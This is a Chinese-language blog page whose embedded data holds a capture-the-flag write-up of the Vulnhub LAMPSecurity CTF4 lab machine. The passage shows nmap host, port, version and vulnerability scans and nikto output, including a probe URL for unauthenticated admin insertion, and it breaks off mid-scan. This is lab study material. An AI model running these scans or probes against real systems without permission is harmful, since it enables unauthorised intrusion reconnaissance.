<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录学习、生活" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/c7a2fe90f78ca0e4.css" as="style"/><link rel="stylesheet" href="/_next/static/css/c7a2fe90f78ca0e4.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-4b638ff538b97055.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-81a2b7b9623e52f7.js" defer=""></script><script src="/_next/static/lg8P0Lo-zDl0pbzeQCZZz/_buildManifest.js" defer=""></script><script src="/_next/static/lg8P0Lo-zDl0pbzeQCZZz/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"VulnhubLAMPSecurity CTF4","contentHtml":"\u003ch1\u003eLAMPSecurity: CTF4\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.vulnhub.com/entry/lampsecurity-ctf4,83/\"\u003ehttps://www.vulnhub.com/entry/lampsecurity-ctf4,83/\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e端口扫描主机发现\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e探测存活主机，\u003ccode\u003e138\u003c/code\u003e是靶机\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sP \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e \n\u003cspan class=\"hljs-comment\"\u003e//                                    \u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.93\u003c/span\u003e ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-09-23 14:13 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.1\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00062\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:C0:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.2\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00046\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:FB:CA:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.138\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00020\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003eF:\u003cspan class=\"hljs-number\"\u003e67\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.254\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00027\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:F8:B3:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003eA (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.131\u003c/span\u003e\nHost is up.\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e探测主机所有开放端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sT -min-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.138\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.93\u003c/span\u003e ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-09-23 14:16 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.138\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00064\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65512\u003c/span\u003e filtered tcp \u003cspan class=\"hljs-title function_ invoke__\"\u003eports\u003c/span\u003e (no-response), \u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e filtered tcp \u003cspan class=\"hljs-title function_ invoke__\"\u003eports\u003c/span\u003e (host-unreach)\nPORT    STATE  SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp  open   ssh\n\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e/tcp  open   smtp\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp  open   http\n\u003cspan class=\"hljs-number\"\u003e631\u003c/span\u003e/tcp closed ipp\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003eF:\u003cspan class=\"hljs-number\"\u003e67\u003c/span\u003e (VMware)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e探测服务版本以及系统版本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sT -sV -O -p22,\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e631\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.138\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.93\u003c/span\u003e ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-09-23 14:20 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.138\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00046\u003c/span\u003es latency).\n\nPORT    STATE  SERVICE VERSION\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp  open   ssh     OpenSSH \u003cspan class=\"hljs-number\"\u003e4.3\u003c/span\u003e (protocol \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e)\n\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e/tcp  open   smtp    Sendmail \u003cspan class=\"hljs-number\"\u003e8.13\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e8.13\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp  open   http    Apache httpd \u003cspan class=\"hljs-number\"\u003e2.2\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ((Fedora))\n\u003cspan class=\"hljs-number\"\u003e631\u003c/span\u003e/tcp closed ipp\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003eF:\u003cspan class=\"hljs-number\"\u003e67\u003c/span\u003e (VMware)\nDevice type: general purpose|remote management|terminal server|\u003cspan class=\"hljs-keyword\"\u003eswitch\u003c/span\u003e|proxy server|WAP\n\u003cspan class=\"hljs-title function_ invoke__\"\u003eRunning\u003c/span\u003e (JUST GUESSING): Linux \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e.X|\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e.X|\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e.\u003cspan class=\"hljs-title function_ invoke__\"\u003eX\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e98\u003c/span\u003e%), Control4 \u003cspan class=\"hljs-title function_ invoke__\"\u003eembedded\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003e%), Lantronix \u003cspan class=\"hljs-title function_ invoke__\"\u003eembedded\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003e%), SNR \u003cspan class=\"hljs-title function_ invoke__\"\u003eembedded\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e%), SonicWALL \u003cspan class=\"hljs-title function_ invoke__\"\u003eembedded\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e94\u003c/span\u003e%), Dell iDRAC \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e94\u003c/span\u003e%)\nOS CPE: cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e cpe:/h:lantronix:slc_8 cpe:/h:snr:snr-s2960 cpe:/o:sonicwall:aventail_ex-\u003cspan class=\"hljs-number\"\u003e6000\u003c/span\u003e cpe:/o:dell:idrac6_firmware cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e3.10\u003c/span\u003e cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e4.1\u003c/span\u003e\nAggressive OS guesses: Linux \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e98\u003c/span\u003e%), Linux \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003e%), Control4 HC-\u003cspan class=\"hljs-number\"\u003e300\u003c/span\u003e home \u003cspan class=\"hljs-title function_ invoke__\"\u003econtroller\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003e%), Lantronix SLC \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e terminal \u003cspan class=\"hljs-title function_ invoke__\"\u003eserver\u003c/span\u003e (Linux \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e) (\u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003e%), SNR SNR-S2960 \u003cspan class=\"hljs-keyword\"\u003eswitch\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e%), SonicWALL Aventail EX-\u003cspan class=\"hljs-number\"\u003e6000\u003c/span\u003e VPN \u003cspan class=\"hljs-title function_ invoke__\"\u003eappliance\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e94\u003c/span\u003e%), Linux \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e94\u003c/span\u003e%), Linux \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e94\u003c/span\u003e%), Dell iDRAC \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e remote access \u003cspan class=\"hljs-title function_ invoke__\"\u003econtroller\u003c/span\u003e (Linux \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e) (\u003cspan class=\"hljs-number\"\u003e94\u003c/span\u003e%), Linux \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e94\u003c/span\u003e%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-title function_ invoke__\"\u003ehost\u003c/span\u003e (test conditions non-ideal).\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hop\nService Info: Host: ctf4.sas.upenn.edu; OS: Unix\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描漏洞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -script=vuln -p \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.138\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.93\u003c/span\u003e ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-09-23 14:25 CST\u003c/span\u003e\nPre-scan script results:\n| broadcast-avahi-dos: \n|   Discovered hosts:\n|     \u003cspan class=\"hljs-number\"\u003e224.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.251\u003c/span\u003e\n|   After \u003cspan class=\"hljs-literal\"\u003eNULL\u003c/span\u003e UDP avahi packet \u003cspan class=\"hljs-title function_ invoke__\"\u003eDoS\u003c/span\u003e (CVE-\u003cspan class=\"hljs-number\"\u003e2011\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1002\u003c/span\u003e).\n|_  Hosts are all \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (not vulnerable).\n\u003cspan class=\"hljs-comment\"\u003e// 扫描卡住不知道什么情况\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用nikto扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enikto -host \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.138\u003c/span\u003e -port \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e631\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\n- Nikto v2.\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e\n---------------------------------------------------------------------------\n---------------------------------------------------------------------------\n---------------------------------------------------------------------------\n---------------------------------------------------------------------------\n+ Target IP:          \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.138\u003c/span\u003e\n+ Target Hostname:    \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.138\u003c/span\u003e\n+ Target Port:        \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e\n+ Start Time:         \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e09\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e (GMT8)\n---------------------------------------------------------------------------\n+ Server: Apache/\u003cspan class=\"hljs-number\"\u003e2.2\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e (Fedora)\n+ /: Retrieved x-powered-by header: PHP/\u003cspan class=\"hljs-number\"\u003e5.1\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e.\n+ /: The anti-clickjacking X-Frame-Options header is not present. See: https:\u003cspan class=\"hljs-comment\"\u003e//developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\u003c/span\u003e\n+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https:\u003cspan class=\"hljs-comment\"\u003e//www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/\u003c/span\u003e\n+ /robots.txt: Server may leak inodes via ETags, header found with file /robots.txt, inode: \u003cspan class=\"hljs-number\"\u003e487720\u003c/span\u003e, size: \u003cspan class=\"hljs-number\"\u003e104\u003c/span\u003e, mtime: Wed Dec \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e07\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2014\u003c/span\u003e. See: http:\u003cspan class=\"hljs-comment\"\u003e//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418\u003c/span\u003e\n+ /sql/: \u003cspan class=\"hljs-built_in\"\u003eDirectory\u003c/span\u003e indexing found.\n+ /robots.txt: Entry \u003cspan class=\"hljs-string\"\u003e'/sql/'\u003c/span\u003e is returned a non-forbidden \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e redirect HTTP \u003cspan class=\"hljs-title function_ invoke__\"\u003ecode\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e). See: https:\u003cspan class=\"hljs-comment\"\u003e//portswigger.net/kb/issues/00600600_robots-txt-file\u003c/span\u003e\n+ /robots.txt: Entry \u003cspan class=\"hljs-string\"\u003e'/conf/'\u003c/span\u003e is returned a non-forbidden \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e redirect HTTP \u003cspan class=\"hljs-title function_ invoke__\"\u003ecode\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e). See: https:\u003cspan class=\"hljs-comment\"\u003e//portswigger.net/kb/issues/00600600_robots-txt-file\u003c/span\u003e\n+ /robots.txt: Entry \u003cspan class=\"hljs-string\"\u003e'/admin/'\u003c/span\u003e is returned a non-forbidden \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e redirect HTTP \u003cspan class=\"hljs-title function_ invoke__\"\u003ecode\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e). See: https:\u003cspan class=\"hljs-comment\"\u003e//portswigger.net/kb/issues/00600600_robots-txt-file\u003c/span\u003e\n+ /robots.txt: contains \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e entries which should be manually viewed. See: https:\u003cspan class=\"hljs-comment\"\u003e//developer.mozilla.org/en-US/docs/Glossary/Robots.txt\u003c/span\u003e\n+ Apache/\u003cspan class=\"hljs-number\"\u003e2.2\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e appears to be \u003cspan class=\"hljs-title function_ invoke__\"\u003eoutdated\u003c/span\u003e (current is at least Apache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e). Apache \u003cspan class=\"hljs-number\"\u003e2.2\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e34\u003c/span\u003e is the EOL \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e the \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e.x branch.\n+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .\n+ /: Web Server returns a valid response with junk HTTP methods which may cause \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e positives.\n+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https:\u003cspan class=\"hljs-comment\"\u003e//owasp.org/www-community/attacks/Cross_Site_Tracing\u003c/span\u003e\n+ /admin/login.php?action=insert\u0026#x26;username=test\u0026#x26;password=test: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to log in with user \u003cspan class=\"hljs-string\"\u003e'test'\u003c/span\u003e password \u003cspan class=\"hljs-string\"\u003e'test'\u003c/span\u003e to verify. See: http:\u003cspan class=\"hljs-comment\"\u003e//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0995\u003c/span\u003e\n+ /usage/: Webalizer may be installed. Versions lower than \u003cspan class=\"hljs-number\"\u003e2.01\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e09\u003c/span\u003e vulnerable to Cross Site \u003cspan class=\"hljs-title function_ invoke__\"\u003eScripting\u003c/span\u003e (XSS). See: http:\u003cspan class=\"hljs-comment\"\u003e//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0835\u003c/span\u003e\n+ /?=PHPB8B5F2A0-\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003eC92-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003ed3-A3A9-\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003eC7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-\u003cspan class=\"hljs-number\"\u003e12184\u003c/span\u003e\n+ /?=PHPE9568F34-D428-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003ed2-A769-\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003eAA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-\u003cspan class=\"hljs-number\"\u003e12184\u003c/span\u003e\n+ 